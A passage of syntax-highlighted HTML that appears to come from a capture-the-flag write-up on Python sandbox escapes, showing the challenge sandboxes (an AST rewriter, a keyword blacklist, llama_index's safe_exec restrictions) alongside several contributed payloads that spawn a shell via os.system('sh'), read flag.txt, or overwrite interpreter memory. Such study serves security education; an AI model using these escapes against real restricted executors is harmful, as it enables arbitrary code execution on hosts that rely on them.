<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    memory<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>wow<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">+</span> <span class="token number">14</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> x<span class="token punctuation">]</span> <span class="token operator">=</span> sys<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token comment"># Overwriting tp_repr</span>
fake <span class="token operator">=</span> wow<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     memory<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>fake<span class="token punctuation">)</span> <span class="token operator">+</span> x<span class="token punctuation">]</span> <span class="token operator">=</span> command<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token comment"># Overwriting ob_refcnt</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>fake<span class="token punctuation">)</span></code>`,el,Gs,Pp,wi,cl,Vs,To,Ao,vi,ll,$s,k2=`<code class="language-py"><span class="token keyword">import</span> ast

<span class="token keyword">def</span> <span class="token function">safe_import</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Why do you need imports to make tea?"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Why do you need function calls to make tea?"</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">CoolDownTea</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeTransformer<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">visit_Call</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Call<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Call<span class="token punctuation">(</span>func<span class="token operator">=</span>ast<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">'safe_call'</span><span class="token punctuation">,</span> ctx<span class="token operator">=</span>ast<span class="token punctuation">.</span>Load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keywords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_Import</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Expr<span class="token punctuation">(</span>value<span class="token operator">=</span>ast<span class="token punctuation">.</span>Call<span class="token punctuation">(</span>func<span class="token operator">=</span>ast<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">'safe_import'</span><span class="token punctuation">,</span> ctx<span class="token operator">=</span>ast<span class="token punctuation">.</span>Load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keywords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_ImportFrom</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Expr<span class="token punctuation">(</span>value<span class="token operator">=</span>ast<span class="token punctuation">.</span>Call<span class="token punctuation">(</span>func<span class="token operator">=</span>ast<span class="token punctuation">.</span>Name<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token string">'safe_import'</span><span class="token punctuation">,</span> ctx<span class="token operator">=</span>ast<span class="token punctuation">.</span>Load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> keywords<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_Assign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Assign<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Assign<span class="token punctuation">(</span>targets<span class="token operator">=</span>node<span class="token punctuation">.</span>targets<span class="token punctuation">,</span> value<span class="token operator">=</span>ast<span class="token punctuation">.</span>Constant<span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">def</span> <span class="token function">visit_BinOp</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>BinOp<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ast<span class="token punctuation">.</span>AST<span class="token punctuation">:</span>
    <span class="token keyword">return</span> ast<span class="token punctuation">.</span>BinOp<span class="token punctuation">(</span>left<span class="token operator">=</span>ast<span class="token punctuation">.</span>Constant<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> op<span class="token operator">=</span>node<span class="token punctuation">.</span>op<span class="token punctuation">,</span> right<span class="token operator">=</span>ast<span class="token punctuation">.</span>Constant<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Nothing is quite like a cup of tea in the morning: '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

cup <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
cup <span class="token operator">=</span> CoolDownTea<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>visit<span class="token punctuation">(</span>cup<span class="token punctuation">)</span>
ast<span class="token punctuation">.</span>fix_missing_locations<span class="token punctuation">(</span>cup<span class="token punctuation">)</span>

<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>cup<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'safe_import'</span><span class="token punctuation">:</span> safe_import<span class="token punctuation">,</span> <span class="token string">'safe_call'</span><span class="token punctuation">:</span> safe_call<span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code>`,ul,Js,Oo,Fo,Ei,kl,Ks,r2=`<code class="language-py"><span class="token comment"># (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= &#123;"safe_import": safe_import, "safe_call": safe_call, "help": b&#125;; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]</span>
__builtins__ <span class="token operator">|</span><span class="token operator">=</span> safe_import<span class="token punctuation">.</span>__builtins__<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token builtin">help</span><span class="token punctuation">[</span><span class="token string">"sh"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token builtin">help</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">help</span><span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system <span class="token keyword">for</span> <span class="token builtin">help</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>safe_import<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @ChattyPlatinumCool - https://medium.com/@harryfyx/writeup-uiuctf-2024-astea-7b27ec0b9159</span>
<span class="token punctuation">[</span>license <span class="token operator">:=</span> safe_import<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>license<span class="token punctuation">]</span><span class="token punctuation">;</span>
license<span class="token punctuation">.</span>_Printer__filenames <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>safe_call <span class="token operator">:=</span> license<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>reverse<span class="token punctuation">]</span><span class="token punctuation">;</span>
safe_call<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>safe_import <span class="token operator">:=</span> license<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> sys

<span class="token comment"># @WorldWideFlags - https://yun.ng/c/ctf/2024-uiuctf/misc/astea</span>
builtins<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token operator">=</span> safe_import<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
license<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token operator">=</span> builtins<span class="token punctuation">.</span>license<span class="token punctuation">;</span>
license<span class="token punctuation">.</span>_Printer__setup<span class="token punctuation">:</span> <span class="token string">""</span> <span class="token operator">=</span> builtins<span class="token punctuation">.</span>breakpoint<span class="token punctuation">;</span>
<span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>license<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span></code>`,rl,Zs,Hp,hi,il,Xs,Ro,Do,xi,_l,Qs,i2=`<code class="language-py"><span class="token comment">#!/usr/local/bin/python</span>
<span class="token keyword">from</span> exec_utils <span class="token keyword">import</span> safe_exec
<span class="token keyword">def</span> <span class="token function">my_safe_exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># even MORE safe, surely nothing you can do now!!!</span>
    <span class="token keyword">assert</span> __source<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii check failed"</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"match"</span><span class="token punctuation">,</span> <span class="token string">"case"</span><span class="token punctuation">,</span> <span class="token string">"async"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"frame"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"byte"</span><span class="token punctuation">,</span> <span class="token string">"coding"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">assert</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> __source<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string"> is banned"</span></span>
    <span class="token keyword">return</span> safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    __source <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter code: "</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>inp<span class="token operator">:=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"#EOF"</span><span class="token punctuation">:</span>
            __source <span class="token operator">+=</span> inp <span class="token operator">+</span> <span class="token string">"&#92;n"</span>
    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        my_safe_exec<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">except</span> AssertionError <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span></code>`,dl,sn,Io,jo,Ci,fl,nn,_2=`<code class="language-py"><span class="token comment"># code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py</span>
<span class="token comment"># was main at the time of writing chall, however commit provided incase of changes</span>
<span class="token keyword">import</span> ast
<span class="token keyword">import</span> copy
<span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType<span class="token punctuation">,</span> ModuleType
<span class="token keyword">from</span> typing <span class="token keyword">import</span> Any<span class="token punctuation">,</span> Dict<span class="token punctuation">,</span> Mapping<span class="token punctuation">,</span> Sequence<span class="token punctuation">,</span> Union

ALLOWED_IMPORTS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"math"</span><span class="token punctuation">,</span>
    <span class="token string">"time"</span><span class="token punctuation">,</span>
    <span class="token string">"datetime"</span><span class="token punctuation">,</span>
    <span class="token string">"pandas"</span><span class="token punctuation">,</span>
    <span class="token string">"scipy"</span><span class="token punctuation">,</span>
    <span class="token string">"numpy"</span><span class="token punctuation">,</span>
    <span class="token string">"matplotlib"</span><span class="token punctuation">,</span>
    <span class="token string">"plotly"</span><span class="token punctuation">,</span>
    <span class="token string">"seaborn"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_restricted_import</span><span class="token punctuation">(</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token builtin">globals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token builtin">locals</span><span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    fromlist<span class="token punctuation">:</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    level<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ModuleType<span class="token punctuation">:</span>
    <span class="token keyword">if</span> name <span class="token keyword">in</span> ALLOWED_IMPORTS<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">,</span> fromlist<span class="token punctuation">,</span> level<span class="token punctuation">)</span>
    <span class="token keyword">raise</span> ImportError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Import of module '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">' is not allowed"</span></span><span class="token punctuation">)</span>

ALLOWED_BUILTINS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"abs"</span><span class="token punctuation">:</span> <span class="token builtin">abs</span><span class="token punctuation">,</span>
    <span class="token string">"all"</span><span class="token punctuation">:</span> <span class="token builtin">all</span><span class="token punctuation">,</span>
    <span class="token string">"any"</span><span class="token punctuation">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    <span class="token string">"ascii"</span><span class="token punctuation">:</span> <span class="token builtin">ascii</span><span class="token punctuation">,</span>
    <span class="token string">"bin"</span><span class="token punctuation">:</span> <span class="token builtin">bin</span><span class="token punctuation">,</span>
    <span class="token string">"bool"</span><span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">,</span>
    <span class="token string">"bytearray"</span><span class="token punctuation">:</span> <span class="token builtin">bytearray</span><span class="token punctuation">,</span>
    <span class="token string">"bytes"</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span>
    <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">,</span>
    <span class="token string">"complex"</span><span class="token punctuation">:</span> <span class="token builtin">complex</span><span class="token punctuation">,</span>
    <span class="token string">"divmod"</span><span class="token punctuation">:</span> <span class="token builtin">divmod</span><span class="token punctuation">,</span>
    <span class="token string">"enumerate"</span><span class="token punctuation">:</span> <span class="token builtin">enumerate</span><span class="token punctuation">,</span>
    <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>
    <span class="token string">"float"</span><span class="token punctuation">:</span> <span class="token builtin">float</span><span class="token punctuation">,</span>
    <span class="token string">"format"</span><span class="token punctuation">:</span> <span class="token builtin">format</span><span class="token punctuation">,</span>
    <span class="token string">"frozenset"</span><span class="token punctuation">:</span> <span class="token builtin">frozenset</span><span class="token punctuation">,</span>
    <span class="token string">"hash"</span><span class="token punctuation">:</span> <span class="token builtin">hash</span><span class="token punctuation">,</span>
    <span class="token string">"hex"</span><span class="token punctuation">:</span> <span class="token builtin">hex</span><span class="token punctuation">,</span>
    <span class="token string">"int"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    <span class="token string">"isinstance"</span><span class="token punctuation">:</span> <span class="token builtin">isinstance</span><span class="token punctuation">,</span>
    <span class="token string">"issubclass"</span><span class="token punctuation">:</span> <span class="token builtin">issubclass</span><span class="token punctuation">,</span>
    <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>
    <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>
    <span class="token string">"map"</span><span class="token punctuation">:</span> <span class="token builtin">map</span><span class="token punctuation">,</span>
    <span class="token string">"max"</span><span class="token punctuation">:</span> <span class="token builtin">max</span><span class="token punctuation">,</span>
    <span class="token string">"min"</span><span class="token punctuation">:</span> <span class="token builtin">min</span><span class="token punctuation">,</span>
    <span class="token string">"oct"</span><span class="token punctuation">:</span> <span class="token builtin">oct</span><span class="token punctuation">,</span>
    <span class="token string">"ord"</span><span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">,</span>
    <span class="token string">"pow"</span><span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">,</span>
    <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>
    <span class="token string">"range"</span><span class="token punctuation">:</span> <span class="token builtin">range</span><span class="token punctuation">,</span>
    <span class="token string">"repr"</span><span class="token punctuation">:</span> <span class="token builtin">repr</span><span class="token punctuation">,</span>
    <span class="token string">"reversed"</span><span class="token punctuation">:</span> <span class="token builtin">reversed</span><span class="token punctuation">,</span>
    <span class="token string">"round"</span><span class="token punctuation">:</span> <span class="token builtin">round</span><span class="token punctuation">,</span>
    <span class="token string">"set"</span><span class="token punctuation">:</span> <span class="token builtin">set</span><span class="token punctuation">,</span>
    <span class="token string">"slice"</span><span class="token punctuation">:</span> <span class="token builtin">slice</span><span class="token punctuation">,</span>
    <span class="token string">"sorted"</span><span class="token punctuation">:</span> <span class="token builtin">sorted</span><span class="token punctuation">,</span>
    <span class="token string">"str"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    <span class="token string">"sum"</span><span class="token punctuation">:</span> <span class="token builtin">sum</span><span class="token punctuation">,</span>
    <span class="token string">"tuple"</span><span class="token punctuation">:</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span>
    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token builtin">type</span><span class="token punctuation">,</span>
    <span class="token string">"zip"</span><span class="token punctuation">:</span> <span class="token builtin">zip</span><span class="token punctuation">,</span>
    <span class="token comment"># Constants</span>
    <span class="token string">"True"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token string">"False"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token string">"None"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token string">"__import__"</span><span class="token punctuation">:</span> _restricted_import<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">def</span> <span class="token function">_get_restricted_globals</span><span class="token punctuation">(</span>__globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">dict</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    restricted_globals <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>ALLOWED_BUILTINS<span class="token punctuation">)</span>
    <span class="token keyword">if</span> __globals<span class="token punctuation">:</span>
        restricted_globals<span class="token punctuation">.</span>update<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span>
    <span class="token keyword">return</span> restricted_globals

vulnerable_code_snippets <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"os."</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">DunderVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">False</span>
        self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">False</span>

        builtins <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_builtins <span class="token operator">=</span> builtins

    <span class="token keyword">def</span> <span class="token function">visit_Name</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Attribute<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_contains_protected_access</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token comment"># do not allow imports</span>
    imports_modules <span class="token operator">=</span> <span class="token boolean">False</span>
    tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    <span class="token keyword">for</span> node <span class="token keyword">in</span> ast<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>Import<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

    dunder_visitor <span class="token operator">=</span> DunderVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    dunder_visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>

    <span class="token keyword">for</span> vulnerable_code_snippet <span class="token keyword">in</span> vulnerable_code_snippets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> vulnerable_code_snippet <span class="token keyword">in</span> code<span class="token punctuation">:</span>
            dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        dunder_visitor<span class="token punctuation">.</span>has_access_to_private_entity
        <span class="token keyword">or</span> dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin
        <span class="token keyword">or</span> imports_modules
    <span class="token punctuation">)</span>

